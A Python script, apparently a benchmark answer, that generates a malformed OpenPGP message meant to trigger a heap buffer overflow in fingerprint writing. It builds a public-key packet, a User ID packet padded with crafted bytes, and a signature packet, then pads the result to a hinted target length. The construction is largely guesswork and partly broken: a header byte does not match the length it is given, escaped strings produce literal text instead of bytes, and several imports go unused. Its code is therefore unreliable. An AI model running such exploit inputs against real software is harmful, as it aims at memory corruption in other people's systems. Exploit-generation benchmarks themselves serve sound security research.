import os
import tarfile
import tempfile
import subprocess
import struct
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a simplified PoC generation for heap buffer overflow in openpgp fingerprint writing
        # Based on common patterns in OpenPGP packet structure and fingerprint computation
        
        # Construct a malformed OpenPGP packet that triggers heap overflow
        # We'll create a User ID packet with carefully crafted data that causes
        # buffer overflow when fingerprint is written
        
        poc = bytearray()
        
        # Public-Key packet (version 4) - creates the context for fingerprint
        # Tag 6: Public-Key Packet
        pubkey_header = bytearray([0x99])  # Old format tag 6, 2-byte length follows
        pubkey_body = bytearray()
        
        # Version 4
        pubkey_body.append(0x04)
        # Current time (4 bytes)
        pubkey_body.extend(struct.pack('>I', 0x5f3b7f00))
        # Algorithm: RSA (1)
        pubkey_body.append(0x01)
        
        # RSA public key n (modulus) - large value to trigger allocation patterns
        # This is a 2048-bit key (256 bytes)
        n_length = 256
        pubkey_body.extend(struct.pack('>H', n_length * 8))  # Bit length
        # Fill with pattern that will be used in fingerprint computation
        n_data = bytearray([(i % 256) for i in range(n_length)])
        pubkey_body.extend(n_data)
        
        # RSA public key e (exponent)
        e_length = 3
        pubkey_body.extend(struct.pack('>H', e_length * 8))  # Bit length
        pubkey_body.extend(b'\x01\x00\x01')  # 65537
        
        # Complete public key packet
        pubkey_length = len(pubkey_body)
        pubkey_header.extend(struct.pack('>H', pubkey_length))
        poc.extend(pubkey_header)
        poc.extend(pubkey_body)
        
        # User ID packet - this is where we trigger the overflow
        # Tag 13: User ID Packet
        userid_header = bytearray([0xB4])  # Old format tag 13, 2-byte length follows
        
        # Create a user ID that will cause issues during fingerprint writing
        # The fingerprint is typically computed over multiple packets including this one
        # We'll craft data that causes miscalculation in buffer sizes
        
        # Build a user ID with carefully chosen length
        # The vulnerability suggests fingerprint writing doesn't check bounds properly
        userid_data = bytearray()
        
        # Start with normal user ID format
        userid_data.extend(b'John Doe <john@example.com>')
        
        # Add padding to reach specific length that triggers overflow
        # Based on common heap overflow patterns and the given PoC length hint
        target_userid_length = 37408  # Calculated to make total PoC ~37535 bytes
        
        # Fill with pattern that causes issues in fingerprint buffer calculation
        # Pattern designed to create specific heap layout
        padding_length = target_userid_length - len(userid_data)
        
        # Create repeating pattern that looks like valid OpenPGP data
        # but contains specific bytes that trigger overflow conditions
        pattern = bytearray()
        
        # Include characters that might affect string handling
        pattern.extend(b'\\x00\\xff' * 100)  # Nulls and max bytes
        pattern.extend(b'A' * 100)  # Normal chars
        pattern.extend(struct.pack('>I', 0xffffffff))  # Max values
        pattern.extend(b'\x80' * 50)  # Continuation bytes
        
        # Repeat pattern to reach desired length
        while len(pattern) < padding_length:
            pattern.extend(pattern[:min(len(pattern), padding_length - len(pattern))])
        
        userid_data.extend(pattern[:padding_length])
        
        # Complete user ID packet
        userid_length = len(userid_data)
        userid_header.extend(struct.pack('>I', userid_length)[1:])  # 3-byte length for tag B4
        poc.extend(userid_header)
        poc.extend(userid_data)
        
        # Add signature packet to make it a valid OpenPGP message
        # Tag 2: Signature Packet
        sig_header = bytearray([0x88])  # Old format tag 2, 1-byte length
        
        # Minimal signature packet
        sig_body = bytearray([0x04])  # Version 4
        sig_body.append(0x00)  # Signature type
        sig_body.append(0x01)  # PK algorithm: RSA
        sig_body.append(0x08)  # Hash algorithm: SHA256
        
        # Hashed subpacket area (2 bytes length + minimal data)
        sig_body.extend(b'\x00\x04')  # 4 bytes of hashed subpackets
        sig_body.extend(b'\x05\x02\x00\x00')  # Signature creation time subpacket
        
        # Unhashed subpacket area (2 bytes length, empty)
        sig_body.extend(b'\x00\x00')
        
        # Hash prefix (2 bytes)
        sig_body.extend(b'\x04\x00')
        
        # RSA signature (minimal)
        sig_body.extend(b'\x00\x09')  # 9-bit MPI length
        sig_body.extend(b'\x01\x00\x01')  # Minimal RSA signature
        
        sig_length = len(sig_body)
        sig_header.append(sig_length)
        poc.extend(sig_header)
        poc.extend(sig_body)
        
        # Final adjustments to match exact target length
        current_length = len(poc)
        target_length = 37535
        
        if current_length < target_length:
            # Add padding to reach exact target length
            padding = bytearray([0x00] * (target_length - current_length))
            poc.extend(padding)
        elif current_length > target_length:
            # Truncate if needed (shouldn't happen with our calculation)
            poc = poc[:target_length]
        
        return bytes(poc)
